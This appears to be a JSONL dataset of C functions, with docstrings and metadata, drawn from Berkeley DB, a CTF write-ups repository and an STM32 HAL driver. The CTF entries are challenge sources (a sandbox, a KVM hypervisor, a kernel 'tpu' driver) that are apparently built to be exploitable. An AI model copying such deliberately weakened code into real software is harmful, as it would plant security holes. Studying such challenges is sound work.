{"docstring": "/*\n * strtoul_err --\n *\tstrtoul(3) with error checking.\n */\n", "func_signal": "int\nstrtoul_err(char *input, u_long *valp)", "code": "{\n\tu_long val;\n\tchar *end;\n\n\t/*\n\t * strtoul requires setting errno to detect errors.\n\t */\n\terrno = 0;\n\tval = strtoul(input, &end, 10);\n\tif (errno == ERANGE) {\n\t\tdbenv->err(dbenv, ERANGE, \"%s\", input);\n\t\treturn (1);\n\t}\n\tif (input[0] == '\\0' ||\n\t    (end[0] != '\\0' && end[0] != '\\n' && !isspace(end[0]))) {\n\t\tdbenv->errx(dbenv, \"%s: invalid unsigned long argument\", input);\n\t\treturn (1);\n\t}\n\n\t*valp = val;\n\treturn (0);\n}", "path": "examples\\c\\csv\\util.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * usage --\n *\n */\n", "func_signal": "int\nusage()", "code": "{\n\tfprintf(stderr, \"usage: %s %s\\n\\t%s\\n\", progname,\n\t    \"[-v] [-l maxlocks]\",\n\t    \"[-n locks] [-p procs] [-T locker=ID|wakeup=ID] [-t threads]\");\n\treturn (EXIT_FAILURE);\n}", "path": "src\\mutex\\test_mutex.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * tm_mutex_stats --\n *\tDisplay mutex statistics.\n */\n", "func_signal": "void\ntm_mutex_stats()", "code": "{\n#ifdef HAVE_STATISTICS\n\tTM *mp;\n\tuintmax_t set_wait, set_nowait;\n\tu_int i;\n\n\tprintf(\"Per-lock mutex statistics.\\n\");\n\tfor (i = 0; i < maxlocks; ++i) {\n\t\tmp = (TM *)(lm_addr + i * sizeof(TM));\n\t\t__mutex_set_wait_info(env, mp->mutex, &set_wait, &set_nowait);\n\t\tprintf(\"mutex %2d: wait: %lu; no wait %lu\\n\", i,\n\t\t    (u_long)set_wait, (u_long)set_nowait);\n\t}\n#endif\n}", "path": "src\\mutex\\test_mutex.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/* Client run-time name. */\n", "func_signal": "int\nusage()", "code": "{\n\tfprintf(stderr, \"usage: %s [-v] -t[0|1|2]\\n\", progname);\n\treturn (EXIT_FAILURE);\n}", "path": "test\\xa\\src5\\client.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/*\n * \n */\n", "func_signal": "void *\ncall_server_thread(void *arguments)", "code": "{\n\tchar *thread_name, *ops[NUM_TESTS];\n\tint ttype;\n\tstruct thread_args args;\n\tint commit, j, success[NUM_TESTS], thread_num, ret;\n\tvoid *result = NULL;\n\tTPINIT *initBuf = NULL;\n\tFBFR *replyBuf = NULL;\n\tlong replyLen = 0;\n\n\n\targs = *((struct thread_args *)arguments);\n\tthread_name =  args.thread_name;\n\tthread_num = atoi(thread_name);\n\tttype = args.type_test;\n\tinit_tests(ops, success, ttype, thread_num);\n\n\tif (verbose)\n\t\tprintf(\"%s:%s: starting thread %i\\n\", progname, thread_name,\n\t\t    thread_num);\n\t\n\t/* Allocate init buffer */\n\tif ((initBuf = (TPINIT *)tpalloc(\"TPINIT\", NULL, TPINITNEED(0))) == 0)\n\t\tgoto tuxedo_err;\n\tinitBuf->flags = TPMULTICONTEXTS;\n\n\tif (tpinit(initBuf) == -1)\n\t\tgoto tuxedo_err;\n\tif (verbose)\n\t\tprintf(\"%s:%s: tpinit() OK\\n\", progname, thread_name);\n\n\t/* Allocate reply buffer. */\n\treplyLen = 1024;\n\tif ((replyBuf = (FBFR*)tpalloc(\"FML32\", NULL, replyLen)) == NULL) \n\t\tgoto tuxedo_err;\n\tif (verbose)\n\t\tprintf(\"%s:%s: tpalloc(\\\"FML32\\\"), reply buffer OK\\n\", \n\t\t    progname, thread_name);\n\n\tfor (j = 0; j < NUM_TESTS; j++) {\n\t\tcommit = 1;\n\n\t\t/* Sync both threads. */\n\t\tif ((ret = sync_thr(&(counters[j*3]), NUM_THREADS,\n\t\t     &(cond_vars[j*3]))) != 0) {\n\t\t\tfprintf(stderr, \n\t\t\t    \"%s:%s: Error syncing threads: %i \\n\",\n\t\t\t    progname, thread_name, ret);\n\t\t\tgoto end;\n\t\t}\n\n\t\t/* Begin the XA transaction. */\n\t\tif (tpbegin(TIMEOUT, 0L) == -1)\n\t\t\tgoto tuxedo_err;\n\t\tif (verbose)\n\t\t\tprintf(\"%s:%s: tpbegin() OK\\n\", progname, thread_name);\n\n\t\t/* Force thread 2 to wait till thread 1 does its operation.*/\n\t\tif (thread_num == 2) {\n\t\t\tif ((ret = sync_thr(&(counters[(j*3)+1]), NUM_THREADS, \n\t\t\t    &(cond_vars[(j*3)+1]))) != 0) {\n\t\t\t\tfprintf(stderr, \n\t\t\t\t    \"%s:%s: Error syncing thread 1: %i \\n\",\n\t\t\t\t    progname, thread_name, ret);\n\t\t\t\tgoto end;\n\t\t\t}\n\t\t}\n\t\tif (verbose)\n\t\t\tprintf(\"%s:%s: calling server %s\\n\", progname, \n\t\t\t    thread_name, ops[j]);\n\n\t\t/* Read or insert into the database. */\n\t\tif (tpcall(ops[j], NULL, 0L, (char **)&replyBuf, \n\t\t    &replyLen, 0) == -1) \n\t\t\tgoto tuxedo_err;\n\n\t\t/* Wake up thread 2.*/\n\t\tif (thread_num == 1) {\n\t\t\tif ((ret = sync_thr(&(counters[(j*3)+1]), NUM_THREADS,\n\t\t\t     &(cond_vars[(j*3)+1]))) != 0) {\n\t\t\t\tfprintf(stderr, \n\t\t\t\t    \"%s:%s: Error syncing thread 1: %i \\n\",\n\t\t\t\t    progname, thread_name, ret);\n\t\t\t\tgoto end;\n\t\t\t}\n\t\t}\n\n\t\t/* Sync both threads. */\n\t\tif ((ret = sync_thr(&(counters[(j*3)+2]), NUM_THREADS,\n\t\t    &(cond_vars[(j*3)+2]))) != 0) {\n\t\t\tfprintf(stderr, \n\t\t\t    \"%s:%s: Error syncing threads: %i \\n\",\n\t\t\t    progname, thread_name, ret);\n\t\t\tgoto end;\n\t\t}\n\n\t\t/* \n\t\t * Commit or abort the transaction depending the what the \n\t\t * server returns. Check that it matched expectation\n\t\t * (We abort on LOCK_NOTGRANTED and DEADLOCK errors, and\n\t\t * commit otherwise.  Other errors result in returning\n\t\t * without committing or aborting.\n\t\t */\n\t\tcommit = !tpurcode;\n\t\tif (commit != success[j]) {\n\t\t\tfprintf(stderr, \n\t\t\t    \"%s:%s: Expected: %i Got: %i.\\n\",\n\t\t\t    progname, thread_name, success[j], commit);\n\t\t\tif (verbose) {\n\t\t\t\tprintf(\"%s:%s: Expected: %i Got: %i.\\n\",\n\t\t\t\t    progname, thread_name, success[j], commit);\n\t\t\t}\n\t\t}\n\t\t\t\n\t\tif (commit) {\n\t\t\tif (tpcommit(0L) == -1) \n\t\t\t\tgoto tuxedo_err;\n\t\t\tif (verbose) {\n\t\t\t\tprintf(\"%s:%s: tpcommit() OK\\n\", progname, \n\t\t\t\t    thread_name);\n\t\t\t}\n\t\t} else {\n\t\t\tif (tpabort(0L) == -1) {\n\t\t\t\tgoto tuxedo_err;\n\t\t\t}\n\t\t\tif (verbose) {\n\t\t\t\tprintf(\"%s:%s: tpabort() OK\\n\", progname, \n\t\t\t\t    thread_name);\n\t\t\t}\n\t\t}\n\t}\n\n\tif (0) {\ntuxedo_err:\tfprintf(stderr, \"%s:%s: TUXEDO ERROR: %s (code %d)\\n\",\n\t\t    progname, thread_name, tpstrerror(tperrno), tperrno);\n\t\t/* \n\t\t * Does not matter what result is, as long as it is not \n\t\t * NULL on error.\n\t\t */\n\t\tresult = (void *)&error;\n\t}\nend:\ttpterm();\n\tif (verbose)\n\t\tprintf(\"%s:%s: tpterm() OK\\n\", progname, thread_name);\n\n\tif (initBuf != NULL)\n\t\ttpfree((char *)initBuf);\n\n\tif (replyBuf != NULL)\n\t\ttpfree((char *)replyBuf);\n\n\treturn(result);\n}", "path": "test\\xa\\src5\\client.c", "repo_name": "berkeleydb/libdb", "stars": 256, "license": "None", "language": "c", "size": 86564}
{"docstring": "/* set up first kernel page */\n", "func_signal": "static void setup_kernelland(void)", "code": "{\n  unsigned int i, j;\n  unsigned char *p;\n  void *stack;\n  int flags;\n\n  flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED;\n  if (mmap(KERNEL_PAGE, PAGE_SIZE, PROT_WRITE, flags, -1, 0) != KERNEL_PAGE)\n    err(1, \"mmap\");\n\n  flags = MAP_PRIVATE | MAP_ANONYMOUS;\n  stack = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE, flags, -1, 0);\n  if (stack == MAP_FAILED)\n    err(1, \"mmap\");\n\n  /* patch kernel function and stack addresses */\n  p = kernel_entry_bin;\n  j = 0;\n  for (i = 0; i < kernel_entry_bin_len - sizeof(long) && j != 3; i++) {\n    if (*(unsigned long *)p == 0xdeadbeefdeadc0de) {\n      *(unsigned long *)p = (unsigned long)&kernel;\n      j |= 1;\n    }\n    else if (*(unsigned long *)p == 0xdeadbeefdeaddead) {\n      *(unsigned long *)p = (unsigned long)stack + STACK_SIZE - sizeof(long);\n      j |= 2;\n    }\n    p++;\n  }\n\n  if (j != 3)\n    errx(1, \"failed to patch stuff\");\n\n  memcpy(KERNEL_PAGE, kernel_entry_bin, kernel_entry_bin_len);\n\n  if (mprotect(KERNEL_PAGE, PAGE_SIZE, PROT_READ | PROT_EXEC) != 0)\n    err(1, \"mprotect\");\n}", "path": "google-ctf-quals-2018\\sandbox-compat\\attachment\\src\\sandbox.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* Maps:\n * 0 ~ 0x200000 -> 0 ~ 0x200000\n */\n", "func_signal": "void setup_paging(VM *vm)", "code": "{\n  struct kvm_sregs sregs;\n  if(ioctl(vm->vcpufd, KVM_GET_SREGS, &sregs) < 0) pexit(\"ioctl(KVM_GET_SREGS)\");\n  uint64_t pml4_addr = MAX_KERNEL_SIZE;\n  uint64_t *pml4 = (void*) (vm->mem + pml4_addr);\n\n  uint64_t pdp_addr = pml4_addr + 0x1000;\n  uint64_t *pdp = (void*) (vm->mem + pdp_addr);\n\n  uint64_t pd_addr = pdp_addr + 0x1000;\n  uint64_t *pd = (void*) (vm->mem + pd_addr);\n\n  pml4[0] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pdp_addr;\n  pdp[0] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pd_addr;\n  pd[0] = PDE64_PRESENT | PDE64_RW | PDE64_PS; /* kernel only, no PED64_USER */\n\n  sregs.cr3 = pml4_addr;\n  sregs.cr4 = CR4_PAE;\n  sregs.cr4 |= CR4_OSFXSR | CR4_OSXMMEXCPT; /* enable SSE instruction */\n  sregs.cr0 = CR0_PE | CR0_MP | CR0_ET | CR0_NE | CR0_WP | CR0_AM | CR0_PG;\n  sregs.efer = EFER_LME | EFER_LMA;\n  sregs.efer |= EFER_SCE; /* enable syscall instruction */\n\n  if(ioctl(vm->vcpufd, KVM_SET_SREGS, &sregs) < 0) pexit(\"ioctl(KVM_SET_SREGS)\");\n}", "path": "hitcon-2018\\abyss\\src\\hypervisor\\hypervisor.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* always returns 0 */\n", "func_signal": "int tpu_delete(struct tpu_device *tdev, int tid)", "code": "{\n\tprepare(tdev);\n\n\tcommand_load(tdev, TPU_R0, tid);\n\tcommand_delete(tdev, TPU_R0);\n\n\tcommit0(tdev);\n}", "path": "hitcon-quals-2019\\PoE\\src\\linux\\drivers\\misc\\tpu\\tpu-interp.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/*\n    B -- 10 -- D -- 11 -- F\n   / \\         |\n  4   |        |\n /    |        |\nA     5        4\n \\    |        |\n  2   |        |\n    \\ |        |\n      C -- 3 - E\n */\n", "func_signal": "static void link(int a, int b, unsigned int weight)", "code": "{\n  printf(\"Creating link between '%c' and '%c' with weight %u\\n\", l[a], l[b], weight);\n  assert(ioctl(fd[a], SPARK_LINK, fd[b] | ((unsigned long long) weight << 32)) == 0);\n}", "path": "hitcon-2020\\spark\\src\\user\\demo.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* always returns 0 */\n", "func_signal": "int tpu_reverse(struct tpu_device *tdev, int tid, uint cur, uint len)", "code": "{\n\tprepare(tdev);\n\n\tcommand_load(tdev, TPU_R0, tid);\n\tcommand_split(tdev, TPU_R0, cur, TPU_R0, TPU_R1);\n\tcommand_split(tdev, TPU_R1, len, TPU_R1, TPU_R2);\n\tcommand_reverse(tdev, TPU_R1);\n\tcommand_merge(tdev, TPU_R1, TPU_R1, TPU_R2);\n\tcommand_merge(tdev, TPU_R0, TPU_R0, TPU_R1);\n\n\tcommit0(tdev);\n}", "path": "hitcon-quals-2019\\PoE\\src\\linux\\drivers\\misc\\tpu\\tpu-interp.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* returns tid */\n", "func_signal": "int tpu_new_tree(struct tpu_device *tdev, uint n, u8 w, void *data)", "code": "{\n\tDECLARE_HANDLER1(handler, NULL);\n\n\tmemcpy(tdev->data, data, n * w);\n\n\tprepare(tdev);\n\tcommand_new(tdev, TPU_R0, w, n);\n\tcommand_info(tdev, TPU_R0);\n\tcommit1(tdev, handler);\n}", "path": "hitcon-quals-2019\\PoE\\src\\linux\\drivers\\misc\\tpu\\tpu-interp.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* returns new tid */\n", "func_signal": "int tpu_paste(struct tpu_device *tdev, int tid1, uint cur, int tid2)", "code": "{\n\tDECLARE_HANDLER1(handler, NULL);\n\n\tprepare(tdev);\n\n\tcommand_load(tdev, TPU_R0, tid1);\n\tcommand_split(tdev, TPU_R0, cur, TPU_R0, TPU_R2);\n\tcommand_load(tdev, TPU_R1, tid2);\n\tcommand_merge(tdev, TPU_R0, TPU_R0, TPU_R1);\n\tcommand_merge(tdev, TPU_R0, TPU_R0, TPU_R2);\n\tcommand_info(tdev, TPU_R0);\n\n\tcommit1(tdev, handler);\n}", "path": "hitcon-quals-2019\\PoE\\src\\linux\\drivers\\misc\\tpu\\tpu-interp.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* copy argv onto kernel's stack */\n", "func_signal": "void copy_argv(VM* vm, int argc, char *argv[])", "code": "{\n  struct kvm_regs regs;\n  if(ioctl(vm->vcpufd, KVM_GET_REGS, &regs) < 0) pexit(\"ioctl(KVM_GET_REGS)\");\n  char *sp = (char*)vm->mem + regs.rsp;\n  char **copy = (char**) malloc(argc * sizeof(char*));\n#define STACK_ALLOC(sp, len) ({ sp -= len; sp; })\n  for(int i = argc - 1; i >= 0; i--) {\n    int len = strlen(argv[i]) + 1;\n    copy[i] = STACK_ALLOC(sp, len);\n    memcpy(copy[i], argv[i], len);\n  }\n  sp = (char*) ((uint64_t) sp & -0x10);\n  /* push argv */\n  *(uint64_t*) STACK_ALLOC(sp, sizeof(char*)) = 0;\n  for(int i = argc - 1; i >= 0; i--)\n    *(uint64_t*) STACK_ALLOC(sp, sizeof(char*)) = copy[i] - (char*)vm->mem;\n  /* push argc */\n  *(uint64_t*) STACK_ALLOC(sp, sizeof(uint64_t)) = argc;\n  free(copy);\n#undef STACK_ALLOC\n  regs.rsp = sp - (char*) vm->mem;\n  if(ioctl(vm->vcpufd, KVM_SET_REGS, &regs) < 0) pexit(\"ioctl(KVM_SET_REGS)\");\n}", "path": "hitcon-2018\\abyss\\src\\hypervisor\\hypervisor.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* return 0 or errno */\n", "func_signal": "int tpu_display(struct tpu_device *tdev, int tid, uint cur, uint len, u8 w, void *data)", "code": "{\n\tconst int n = 3;\n\tint i;\n\tstruct tpu_print_args arg = {\n\t\t.width = w,\n\t\t.data = data,\n\t};\n\tstruct tpu_rsp_handler *handlers = kcalloc(n, sizeof(*handlers), GFP_KERNEL);\n\t/* printk(\"%s: size=%u handlers @\\t%#llx\\n\", __func__, n * sizeof(*handlers), (u64)handlers); */\n\n\tif (!handlers)\n\t\treturn -ENOMEM;\n\thandlers[1].data = &arg;\n\n\tprepare(tdev);\n\n\tcommand_load(tdev, TPU_R0, tid);\n\tcommand_split(tdev, TPU_R0, cur, TPU_R0, TPU_R1);\n\tcommand_split(tdev, TPU_R1, len, TPU_R1, TPU_R2);\n\tcommand_info(tdev, TPU_R1);\n\tcommand_print(tdev, TPU_R1);\n\tcommand_merge(tdev, TPU_R1, TPU_R1, TPU_R2);\n\tcommand_merge(tdev, TPU_R0, TPU_R0, TPU_R1);\n\n\t/* to check tid is not changed */\n\tcommand_info(tdev, TPU_R0);\n\n\tcommit(tdev, n, handlers);\n\n\tfor (i = 0; i < n; i++) {\n\t\tint ret = handlers[i].retval;\n\n\t\tif (ret < 0) {\n\t\t\tkfree(handlers);\n\t\t\treturn ret;\n\t\t}\n\t}\n\tif (tid != handlers[2].retval) {\n\t\tdebug(\"%s: expected tid=%d, got tid=%d\\n\", __func__, tid, handlers[2].retval);\n\t\tkfree(handlers);\n\t\treturn -EBADMSG;\n\t}\n\tkfree(handlers);\n\treturn 0;\n}", "path": "hitcon-quals-2019\\PoE\\src\\linux\\drivers\\misc\\tpu\\tpu-interp.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* copy 32-bit code to r-x memory */\n", "func_signal": "static void copy_user_code(char *code, size_t size)", "code": "{\n  struct opcode *opcode;\n\n  /* ensure that there is no forbidden instructions */\n  for (opcode = opcodes; opcode->name != NULL; opcode++) {\n    if (memchr(code, opcode->opcode, size) != NULL)\n      errx(1, \"opcode %s is not allowed\", opcode->name);\n  }\n\n  if (mprotect(USER_CODE, PAGE_SIZE, PROT_WRITE) != 0)\n    err(1, \"mprotect\");\n\n  memcpy(USER_CODE, code, size);\n\n  if (mprotect(USER_CODE, PAGE_SIZE, PROT_READ | PROT_EXEC) != 0)\n    err(1, \"mprotect\");\n}", "path": "google-ctf-quals-2018\\sandbox-compat\\attachment\\src\\sandbox.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* always returns 0 */\n", "func_signal": "int tpu_cover(struct tpu_device *tdev, int tid, uint cur, uint len, u64 val)", "code": "{\n\tprepare(tdev);\n\n\tcommand_load(tdev, TPU_R0, tid);\n\tcommand_split(tdev, TPU_R0, cur, TPU_R0, TPU_R1);\n\tcommand_split(tdev, TPU_R1, len, TPU_R1, TPU_R2);\n\tcommand_cover(tdev, TPU_R1, val);\n\tcommand_merge(tdev, TPU_R1, TPU_R1, TPU_R2);\n\tcommand_merge(tdev, TPU_R0, TPU_R0, TPU_R1);\n\n\tcommit0(tdev);\n}", "path": "hitcon-quals-2019\\PoE\\src\\linux\\drivers\\misc\\tpu\\tpu-interp.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* check if addr ~ addr+strlen(addr) are all accessible */\n", "func_signal": "int access_string_ok(const void *addr_)", "code": "{\n  if(!access_ok(VERIFY_READ, addr_, 1)) return 0;\n  uint64_t addr = (uint64_t) addr_;\n  uint64_t remain_size = 0x1000 - (addr & 0xfff);\n  /* we have checked the whole page of addr is accessible */\n  uint64_t l = strnlen(addr_, remain_size);\n  /* length not enough.. recursive it */\n  if(l == remain_size) return access_string_ok((void*) (addr + l));\n  return 1;\n}", "path": "hitcon-2018\\abyss\\src\\kernel\\mm\\uaccess.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* ensure that no unexpected mapping is below 4G */\n", "func_signal": "static void check_proc_maps(int verbose)", "code": "{\n  unsigned long start, end;\n  char line[4096];\n  char flags[32];\n  FILE *fp;\n\n  fp = fopen(\"/proc/self/maps\", \"r\");\n  if (fp == NULL)\n    err(1, \"failed to open /proc/self/maps\");\n\n  while (1) {\n    if (fgets(line, sizeof(line), fp) == NULL)\n      break;\n\n    if (sscanf(line, \"%lx-%lx %31s %*x %*x:%*x %*u\", &start, &end, flags) != 3)\n      errx(1, \"fscanf failed\");\n\n    if (start < (1L << 32)) {\n      if (verbose)\n        printf(\"%s\", line);\n      if (!(start == (unsigned long)USER_STACK && end == (unsigned long)USER_STACK + STACK_SIZE) &&\n          !(start == (unsigned long)USER_CODE && end == (unsigned long)USER_CODE + PAGE_SIZE) &&\n          !(start == (unsigned long)LAST_PAGE && end == (unsigned long)KERNEL_PAGE + PAGE_SIZE))\n        errx(1, \"unexpected mapping\");\n    }\n  }\n\n  fclose(fp);\n}", "path": "google-ctf-quals-2018\\sandbox-compat\\attachment\\src\\sandbox.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* file operations */\n", "func_signal": "static long tpu_corddev_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)", "code": "{\n\tstruct tpu_cord *cord = filp->private_data;\n\tvoid __user *argp = (void *)arg;\n\n\tswitch (cmd) {\n\tcase CORD_GET_DEVICE_VERSION:\n\t\treturn tpu_hw_version(cord->tdev);\n\tcase CORD_SET_DATA_WIDTH:\n\t\treturn tpu_cord_set_data_width(cord, arg);\n\tcase CORD_NEW_DATA:\n\t\treturn tpu_cord_new_data(cord, argp);\n\tcase CORD_DISPLAY:\n\t\treturn tpu_cord_display(cord, argp);\n\tcase CORD_CUT:\n\t\treturn tpu_cord_cut(cord, argp);\n\tcase CORD_PASTE:\n\t\treturn tpu_cord_paste(cord, argp);\n\tcase CORD_DELETE:\n\t\treturn tpu_cord_delete(cord, (u32)(ulong)argp);\n\tcase CORD_REVERSE:\n\t\treturn tpu_cord_reverse(cord, argp);\n\tcase CORD_COVER:\n\t\treturn tpu_cord_cover(cord, argp);\n\tdefault:\n\t\treturn -ENOTTY;\n\t}\n}", "path": "hitcon-quals-2019\\PoE\\src\\linux\\drivers\\misc\\tpu\\tpu-cord.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* fetch op and call the handler */\n", "func_signal": "int tpu_rsp_handle(struct tpu_device *tdev, void *arg)", "code": "{\n\tenum TPU_OP op = TPU_OP_END;\n\n\tif (!fetch_rsp(tdev, 1, (u8 *)&op))\n\t\treturn -EBADMSG;\n\tswitch (op) {\n\tcase TPU_OP_VERSION:\n\t\treturn tpu_hw_version_handle(tdev);\n\tcase TPU_OP_PRINT:\n\t\treturn tpu_print_handle(tdev, arg);\n\tcase TPU_OP_INFO:\n\t\treturn tpu_info_handle(tdev);\n\tdefault:\n\t\treturn -EBADMSG;\n\t};\n}", "path": "hitcon-quals-2019\\PoE\\src\\linux\\drivers\\misc\\tpu\\tpu-interp.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/*\n * Switching to long mode usually done by kernel.\n * We put the task in hypervisor because we want our KVM be able to execute\n * normal x86-64 assembled code as well. Which let us easier to debug and test.\n *\n */\n", "func_signal": "void setup_long_mode(VM *vm)", "code": "{\n  setup_paging(vm);\n  setup_seg_regs(vm);\n}", "path": "hitcon-2018\\abyss\\src\\hypervisor\\hypervisor.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* fetch tid */\n", "func_signal": "static int tpu_info_handle(struct tpu_device *tdev)", "code": "{\n\tint ret;\n\n\tif (!fetch_rsp(tdev, 4, (u8 *)&ret))\n\t\treturn -EBADMSG;\n\treturn ret;\n}", "path": "hitcon-quals-2019\\PoE\\src\\linux\\drivers\\misc\\tpu\\tpu-interp.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/*\n * 8-bit nr\n * 2-bit\n *  - 0: follows 4 bits value v, indicating use regs[v]\n *  - 1: follows 4 bits value v, indicating use &regs[v]\n *  - 2: follows 5 bits value v, indicating use the following 2 ** (v-1) bits | 2 ** v immi\n *  - 3: end of arguments\n *\n * mmap(regs[0], 1, 7, 0x22, 0, 0)\n * 8 + (2 + 4) + (2 + 5 + 1) + (2 + 5 + 3) + (2 + 5 + 6) + (2 + 5 + 1) + (2 + 5 + 1) + 2\n * = 8 + 6 + 8 * 5 + 9 = 63\n */\n", "func_signal": "static void fetch_inst(u64 val, u64 *nr, u64 args[], const u64 regs[])", "code": "{\n  *nr = getbit(&val, 8);\n\n  for (int i = 0; i < 6; i++) {\n    u8 t = getbit(&val, 2);\n    if (t == 0)\n      args[i] = regs[getbit(&val, 4)];\n    else if (t == 1)\n      args[i] = (u64) &regs[getbit(&val, 4)];\n    else if (t == 2) {\n      u8 b = getbit(&val, 5);\n      args[i] = getbit(&val, b + 1);\n    }\n    else break;\n  }\n}", "path": "hitcon-2020\\sop\\src\\sop.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/* set rip = entry point\n * set rsp = MAX_KERNEL_SIZE + KERNEL_STACK_SIZE (the max address can be used)\n *\n * set rdi = PS_LIMIT (start of free (unpaging) physical pages)\n * set rsi = MEM_SIZE - rdi (total length of free pages)\n * Kernel could use rdi and rsi to initalize its memory allocator.\n */\n", "func_signal": "void setup_regs(VM *vm, size_t entry)", "code": "{\n  struct kvm_regs regs;\n  if(ioctl(vm->vcpufd, KVM_GET_REGS, &regs) < 0) pexit(\"ioctl(KVM_GET_REGS)\");\n  regs.rip = entry;\n  regs.rsp = MAX_KERNEL_SIZE + KERNEL_STACK_SIZE; /* temporary stack */\n  regs.rdi = PS_LIMIT; /* start of free pages */\n  regs.rsi = MEM_SIZE - regs.rdi; /* total length of free pages */\n  regs.rflags = 0x2;\n  if(ioctl(vm->vcpufd, KVM_SET_REGS, &regs) < 0) pexit(\"ioctl(KVM_SET_REGS\");\n}", "path": "hitcon-2018\\abyss\\src\\hypervisor\\hypervisor.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "// returns true if the program calls SYS_exit\n", "func_signal": "static bool check_state()", "code": "{\n  unsigned long long rax;\n\n  while (is_syscall(&rax)) {\n    if (rax == 60) return true;\n    skip(2);\n  }\n  if (seg_changed()) { fail(\"NO.\"); }\n  return false;\n}", "path": "hitcon-2020\\tenet\\src\\time_machine.c", "repo_name": "david942j/ctf-writeups", "stars": 306, "license": "None", "language": "c", "size": 91372}
{"docstring": "/**\n  * @brief  Starts the TIM Input Capture measurement in interrupt mode.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  Channel: TIM Channels to be enabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_3: TIM Channel 3 selected\n  *            @arg TIM_CHANNEL_4: TIM Channel 4 selected\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_IC_Start_IT (TIM_HandleTypeDef *htim, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_CCX_INSTANCE(htim->Instance, Channel));\n  \n  switch (Channel)\n  {\n    case TIM_CHANNEL_1:\n    {       \n      /* Enable the TIM Capture/Compare 1 interrupt */\n      __HAL_TIM_ENABLE_IT(htim, TIM_IT_CC1);\n    }\n    break;\n    \n    case TIM_CHANNEL_2:\n    {\n      /* Enable the TIM Capture/Compare 2 interrupt */\n      __HAL_TIM_ENABLE_IT(htim, TIM_IT_CC2);\n    }\n    break;\n    \n    case TIM_CHANNEL_3:\n    {\n      /* Enable the TIM Capture/Compare 3 interrupt */\n      __HAL_TIM_ENABLE_IT(htim, TIM_IT_CC3);\n    }\n    break;\n    \n    case TIM_CHANNEL_4:\n    {\n      /* Enable the TIM Capture/Compare 4 interrupt */\n      __HAL_TIM_ENABLE_IT(htim, TIM_IT_CC4);\n    }\n    break;\n    \n    default:\n    break;\n  }  \n  /* Enable the Input Capture channel */\n  TIM_CCxChannelCmd(htim->Instance, Channel, TIM_CCx_ENABLE);\n    \n  /* Enable the Peripheral */\n  __HAL_TIM_ENABLE(htim);  \n\n  /* Return function status */\n  return HAL_OK;  \n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Starts the TIM Base generation.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_Base_Start(TIM_HandleTypeDef *htim)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_INSTANCE(htim->Instance));\n  \n  /* Set the TIM state */\n  htim->State= HAL_TIM_STATE_BUSY;\n  \n  /* Enable the Peripheral */\n  __HAL_TIM_ENABLE(htim);\n  \n  /* Change the TIM state*/\n  htim->State= HAL_TIM_STATE_READY;\n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
